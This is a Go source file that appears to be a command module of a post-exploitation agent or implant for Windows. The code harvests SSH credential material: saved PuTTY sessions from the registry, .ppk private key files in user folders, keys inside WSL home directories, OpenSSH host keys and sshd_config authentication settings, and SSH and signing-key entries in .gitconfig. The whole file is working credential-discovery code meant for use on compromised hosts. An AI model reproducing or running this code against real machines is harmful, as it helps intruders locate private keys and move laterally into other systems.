//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// sshKeysEnumerateWindows extends the enumerate action with Windows-specific
// SSH key stores: PuTTY sessions/keys, WSL distributions, and OpenSSH for Windows.
func sshKeysEnumerateWindows() string {
	var sb strings.Builder

	// --- PuTTY Sessions (registry) ---
	sessions := enumeratePuTTYSessions()
	if len(sessions) > 0 {
		sb.WriteString(fmt.Sprintf("\n[PuTTY Sessions] %d session(s):\n", len(sessions)))
		for _, s := range sessions {
			sb.WriteString(fmt.Sprintf("  Session: %s\n", s.name))
			if s.hostname != "" {
				sb.WriteString(fmt.Sprintf("    HostName: %s\n", s.hostname))
			}
			if s.username != "" {
				sb.WriteString(fmt.Sprintf("    UserName: %s\n", s.username))
			}
			if s.port != "" && s.port != "22" {
				sb.WriteString(fmt.Sprintf("    Port: %s\n", s.port))
			}
			if s.protocol != "" {
				sb.WriteString(fmt.Sprintf("    Protocol: %s\n", s.protocol))
			}
			if s.privateKeyFile != "" {
				sb.WriteString(fmt.Sprintf("    PrivateKey: %s\n", s.privateKeyFile))
			}
			if s.proxyHost != "" {
				sb.WriteString(fmt.Sprintf("    ProxyHost: %s:%s\n", s.proxyHost, s.proxyPort))
			}
		}
	} else {
		sb.WriteString("\n[PuTTY Sessions] No PuTTY sessions found in registry\n")
	}

	// --- PuTTY .ppk files ---
	ppkFiles := findPPKFiles()
	if len(ppkFiles) > 0 {
		sb.WriteString(fmt.Sprintf("\n[PuTTY Keys (.ppk)] %d file(s):\n", len(ppkFiles)))
		for _, ppk := range ppkFiles {
			sb.WriteString(fmt.Sprintf("  %s\n", ppk.path))
			sb.WriteString(fmt.Sprintf("    Type: %s, Encryption: %s\n", ppk.keyType, ppk.encryption))
			if ppk.comment != "" {
				sb.WriteString(fmt.Sprintf("    Comment: %s\n", ppk.comment))
			}
		}
	}

	// --- WSL Distributions ---
	wslDistros := enumerateWSLDistros()
	if len(wslDistros) > 0 {
		sb.WriteString(fmt.Sprintf("\n[WSL Distributions] %d distro(s):\n", len(wslDistros)))
		for _, distro := range wslDistros {
			sb.WriteString(fmt.Sprintf("  %s\n", distro))
			// Check for SSH keys inside WSL filesystem
			wslSSHDir := fmt.Sprintf(`\\wsl$\%s\home`, distro)
			if entries, err := os.ReadDir(wslSSHDir); err == nil {
				for _, entry := range entries {
					if !entry.IsDir() {
						continue
					}
					userSSH := filepath.Join(wslSSHDir, entry.Name(), ".ssh")
					if info, err := os.Stat(userSSH); err == nil && info.IsDir() {
						keys := listSSHKeysInDir(userSSH)
						if len(keys) > 0 {
							sb.WriteString(fmt.Sprintf("    %s/.ssh: %s\n", entry.Name(), strings.Join(keys, ", ")))
						}
					}
				}
			}
		}
	}

	// --- OpenSSH for Windows (system-wide) ---
	programDataSSH := filepath.Join(os.Getenv("ProgramData"), "ssh")
	if info, err := os.Stat(programDataSSH); err == nil && info.IsDir() {
		sb.WriteString("\n[OpenSSH for Windows] System-wide config:\n")
		// Check for host keys
		hostKeys := listSSHKeysInDir(programDataSSH)
		if len(hostKeys) > 0 {
			sb.WriteString(fmt.Sprintf("  Host keys: %s\n", strings.Join(hostKeys, ", ")))
		}
		// Check sshd_config for authorized keys settings
		sshdConfig := filepath.Join(programDataSSH, "sshd_config")
		if content, err := os.ReadFile(sshdConfig); err == nil {
			for _, line := range strings.Split(string(content), "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "#") || line == "" {
					continue
				}
				lower := strings.ToLower(line)
				if strings.HasPrefix(lower, "authorizedkeysfile") ||
					strings.HasPrefix(lower, "passwordauthentication") ||
					strings.HasPrefix(lower, "pubkeyauthentication") {
					sb.WriteString(fmt.Sprintf("  sshd_config: %s\n", line))
				}
			}
			structs.ZeroBytes(content)
		}
	}

	// --- Git Bash SSH keys ---
	userProfile := os.Getenv("USERPROFILE")
	if userProfile != "" {
		// Check for Git-specific config referencing SSH
		gitConfig := filepath.Join(userProfile, ".gitconfig")
		if content, err := os.ReadFile(gitConfig); err == nil {
			for _, line := range strings.Split(string(content), "\n") {
				line = strings.TrimSpace(line)
				if strings.Contains(strings.ToLower(line), "sshcommand") ||
					strings.Contains(strings.ToLower(line), "signingkey") {
					sb.WriteString(fmt.Sprintf("\n[Git Config] %s\n", line))
				}
			}
		}
	}

	return sb.String()
}

// --- PuTTY registry enumeration ---

type puttySession struct {
	name           string
	hostname       string
	username       string
	port           string
	protocol       string
	privateKeyFile string
	proxyHost      string
	proxyPort      string
}

// enumeratePuTTYSessions reads saved PuTTY sessions from the Windows registry.
func enumeratePuTTYSessions() []puttySession {
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\SimonTatham\PuTTY\Sessions`, registry.READ)
	if err != nil {
		return nil
	}
	defer key.Close()

	names, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return nil
	}

	var sessions []puttySession
	for _, name := range names {
		subKey, err := registry.OpenKey(key, name, registry.READ)
		if err != nil {
			continue
		}

		s := puttySession{name: decodePuTTYSessionName(name)}
		s.hostname, _, _ = subKey.GetStringValue("HostName")
		s.username, _, _ = subKey.GetStringValue("UserName")
		s.privateKeyFile, _, _ = subKey.GetStringValue("PublicKeyFile")
		s.proxyHost, _, _ = subKey.GetStringValue("ProxyHost")
		s.proxyPort, _, _ = subKey.GetStringValue("ProxyPort")

		portVal, _, err := subKey.GetIntegerValue("PortNumber")
		if err == nil && portVal > 0 {
			s.port = fmt.Sprintf("%d", portVal)
		}

		protocolVal, _, err := subKey.GetIntegerValue("Protocol")
		if err == nil {
			switch protocolVal {
			case 0:
				s.protocol = "SSH"
			case 1:
				s.protocol = "Telnet"
			case 3:
				s.protocol = "Serial"
			default:
				s.protocol = fmt.Sprintf("type-%d", protocolVal)
			}
		}

		subKey.Close()

		// Skip empty/default sessions
		if s.hostname != "" || s.privateKeyFile != "" {
			sessions = append(sessions, s)
		}
	}

	return sessions
}

// --- PuTTY .ppk file discovery ---

// findPPKFiles searches common Windows locations for PuTTY private key files.
func findPPKFiles() []ppkInfo {
	searchDirs := []string{
		filepath.Join(os.Getenv("USERPROFILE"), ".ssh"),
		filepath.Join(os.Getenv("USERPROFILE"), ".putty"),
		filepath.Join(os.Getenv("APPDATA"), "PuTTY"),
		filepath.Join(os.Getenv("USERPROFILE"), "Documents"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop"),
	}
	return findPPKFilesInDirs(searchDirs)
}

// --- WSL distribution enumeration ---

// enumerateWSLDistros lists installed WSL distributions from the registry.
func enumerateWSLDistros() []string {
	key, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Lxss`, registry.READ)
	if err != nil {
		return nil
	}
	defer key.Close()

	subkeys, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return nil
	}

	var distros []string
	for _, guid := range subkeys {
		subKey, err := registry.OpenKey(key, guid, registry.READ)
		if err != nil {
			continue
		}
		name, _, err := subKey.GetStringValue("DistributionName")
		subKey.Close()
		if err == nil && name != "" {
			distros = append(distros, name)
		}
	}

	return distros
}
